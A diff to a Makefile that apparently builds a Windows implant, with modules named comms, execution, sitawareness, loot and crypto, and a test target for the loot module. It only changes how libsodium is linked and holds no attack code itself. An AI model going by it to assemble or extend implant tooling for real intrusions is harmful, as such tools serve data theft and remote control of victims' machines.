@@ -35,7 +35,8 @@ bin/test_loot.exe : tests/test_loot.cpp loot/loot.cpp file_io/file_io.cpp libs/b
 	$(CXX) -g tests/test_loot.cpp loot/loot.cpp file_io/file_io.cpp libs/base64/base64.cpp -o bin/test_loot.exe -lshlwapi -lurlmon -lcrypt32
 
 main_implant : main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp com_crypto/com_crypto.cpp $(headers)
-	$(CXX) -Lcom_crypto\libsodium-win64\lib\ -o bin/main_implant.exe main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp  libs/base64/base64.cpp com_crypto/com_crypto.cpp -llibsodium  -lwinhttp -lcrypt32 -lbcrypt -lshlwapi  -lurlmon 
+	$(CXX) main_implant.cpp  com_crypto/com_crypto.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp  libs/base64/base64.cpp -o bin/main_implant.exe com_crypto/libsodium-win64/lib/libsodium.a -lwinhttp -lcrypt32 -lbcrypt -lshlwapi  -lurlmon 
 
 clean :
 	$(RM) bin/*.exe
+
